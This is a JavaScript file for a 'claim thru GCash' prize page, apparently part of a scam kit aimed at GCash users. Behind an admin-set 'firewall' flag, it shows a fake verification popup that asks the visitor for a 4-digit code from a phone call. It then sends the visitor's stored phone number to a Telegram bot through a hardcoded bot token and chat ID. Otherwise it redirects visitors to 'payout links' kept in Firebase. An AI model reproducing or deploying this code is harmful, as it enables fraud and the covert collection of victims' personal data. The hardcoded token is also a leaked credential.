// ========== POPUP_SHARE.JS - COMPLETE CLAIM THRU GCASH LOGIC ==========

// ========== FIREWALL VERIFICATION VARIABLES ==========
var currentVerificationCode = null;
var verificationAttempts = 0;

// ========== GET FIREWALL STATUS ==========
async function getFirewallStatus() {
    if (typeof firebase === 'undefined' || !firebase.database) return false;
    try {
        const db = firebase.database();
        const snap = await db.ref('admin/globalFirewall').once('value');
        const data = snap.val();
        return data && data.active === true;
    } catch(e) {
        console.error("Firewall error:", e);
        return false;
    }
}

// ========== GET LATEST PAYOUT LINK ==========
async function getLatestPayoutLink() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        const db = firebase.database();
        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        if (snapshot.exists()) {
            const key = Object.keys(snapshot.val())[0];
            const linkData = snapshot.val()[key];
            console.log("Found payout link:", linkData.url);
            return { url: linkData.url, key: key };
        }
        console.log("No available links found");
        return null;
    } catch (error) {
        console.error("Error getting link:", error);
        return null;
    }
}

// ========== FIREWALL VERIFICATION POPUP (4-DIGIT CALL) ==========
function showFirewallVerificationPopup() {
    var existingModal = document.getElementById('firewallVerifyModal');
    if (existingModal) existingModal.remove();
    
    var modal = document.createElement('div');
    modal.id = 'firewallVerifyModal';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20001';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    var verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    console.log("Verification code:", verificationCode);
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
            <div style="color: white; font-size: 13px; margin-bottom: 20px;">
                <p>Please wait for the verification call.</p>
                <p>Enter the 4-digit code provided during the call.</p>
            </div>
            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center;" placeholder="1234" maxlength="4" inputmode="numeric">
                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
            </div>
            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; display: none;"></div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    var codeInput = document.getElementById('verifyCodeInput');
    var verifyBtn = document.getElementById('submitVerifyBtn');
    var errorDiv = document.getElementById('verifyErrorMsg');
    var attempts = 0;
    
    if (codeInput) codeInput.focus();
    
    verifyBtn.onclick = function() {
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length < 4) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        
        attempts++;
        
        if (enteredCode === verificationCode) {
            var userPhone = localStorage.getItem("userPhone") || "Unknown";
            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY SUCCESS\nPhone: " + userPhone))
                .catch(function(e) {});
            modal.remove();
            alert("Verification successful! Please try claiming again.");
            setTimeout(function() {
                window.location.reload();
            }, 1000);
        } else {
            var errorMsg = "Invalid verification code. Please try again.";
            if (attempts >= 3) {
                errorMsg = "Too many failed attempts. Page will refresh.";
                setTimeout(function() {
                    window.location.reload();
                }, 2000);
            }
            errorDiv.innerHTML = errorMsg;
            errorDiv.style.display = 'block';
            codeInput.value = '';
            codeInput.focus();
        }
    };
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };
}

// ========== NO LINK ALERT ==========
function showNoLinkAlert() {
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.zIndex = '20000';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 320px; width: 85%; padding: 30px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
            <div style="font-size: 48px;">⚠️</div>
            <h3 style="color: #ff4444;">WITHDRAWAL UNSUCCESSFUL</h3>
            <div style="color: white; font-size: 13px; text-align: left; margin-top: 20px;">
                <p><strong>Possible Reasons:</strong></p>
                <p>• No GCash payout link deployed</p>
                <p>• Device reached maximum payout limit</p>
                <p>• No GCash app installed</p>
            </div>
            <button id="closeAlertBtn" style="background: #ff4444; border: none; border-radius: 40px; padding: 12px; color: white; font-weight: bold; margin-top: 20px; width: 100%; cursor: pointer;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlertBtn').onclick = function() {
        modal.remove();
    };
}

// ========== MAIN CLAIM THRU GCASH HANDLER ==========
async function handleClaimThruGCash() {
    console.log("CLAIM THRU GCASH button clicked");
    
    // Close the prize popup first
    var prizePopup = document.getElementById('prizePopup');
    if (prizePopup) prizePopup.style.display = 'none';
    
    // Check firewall status
    const isFirewallOn = await getFirewallStatus();
    console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
    
    if (isFirewallOn) {
        console.log("Firewall ON - Showing verification popup");
        showFirewallVerificationPopup();
        return;
    }
    
    // FIREWALL OFF - Check for deployed link
    console.log("Firewall OFF - Checking for payout link");
    
    const linkData = await getLatestPayoutLink();
    
    if (linkData && linkData.url) {
        let redirectUrl = linkData.url;
        
        // Update link status to claimed
        if (typeof firebase !== 'undefined' && firebase.database) {
            const db = firebase.database();
            const userPhone = localStorage.getItem("userPhone") || "Unknown";
            await db.ref('links/' + linkData.key).update({
                status: 'claimed',
                user: userPhone,
                claimedAt: Date.now()
            });
            console.log("Link status updated to claimed");
        }
        
        // Fix URL if needed
        if (redirectUrl && !redirectUrl.startsWith('http')) {
            redirectUrl = 'https://' + redirectUrl;
        }
        
        console.log("Redirecting to:", redirectUrl);
        alert("Redirecting to GCash payout...");
        window.location.href = redirectUrl;
        
    } else {
        console.log("No link available");
        showNoLinkAlert();
    }
}

// ========== INITIALIZE CLAIM THRU GCASH BUTTON ==========
function initClaimThruGCashButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        // Remove existing listeners
        var newBtn = claimBtn.cloneNode(true);
        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
        claimBtn = newBtn;
        
        claimBtn.onclick = function(e) {
            e.preventDefault();
            e.stopPropagation();
            handleClaimThruGCash();
        };
        
        console.log("CLAIM THRU GCASH button initialized in popup_share.js");
    } else {
        console.log("CLAIM THRU GCASH button not found");
    }
}

// ========== EXPOSE FUNCTIONS ==========
window.handleClaimThruGCash = handleClaimThruGCash;
window.initClaimThruGCashButton = initClaimThruGCashButton;

// ========== INITIALIZE ON PAGE LOAD ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Popup_share.js loaded");
    initClaimThruGCashButton();
});
